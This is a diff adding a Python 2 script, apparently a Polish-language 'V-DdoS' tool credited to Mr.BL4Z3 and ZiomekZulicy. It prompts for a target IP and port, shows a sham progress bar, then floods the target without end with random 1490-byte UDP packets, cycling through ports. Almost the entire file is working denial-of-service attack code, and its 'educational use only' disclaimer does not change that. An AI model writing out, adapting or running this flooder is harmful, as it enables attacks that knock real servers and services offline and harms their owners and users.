@@ -1,0 +1,55 @@
+print ("\033[91m")
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet V-DdoS")
+print
+print "Narzędzie Do DDOS"
+print "Najlepsze Narządzie Do Wysyłania Ataków DDOS"
+print "Made By Mr.BL4Z3. Przekształcone Przez ZiomekZulicy"
+print "Używanie Go W Innym Celu Niż Edukacyjym Jest Zabronione"
+print "Autor Nie Poniso Odpowiedzialniśći Za Wywołane Szkody"
+print
+ip = raw_input("IP Celu : ")
+port = input("Port       : ")
+os.system("clear")
+print("\033[93m")
+os.system("figlet DdoS Attack")
+print("Made By ZiomekZulicy")
+print ("\033[92m")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Wysłano %s Paczek do %s Przez port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
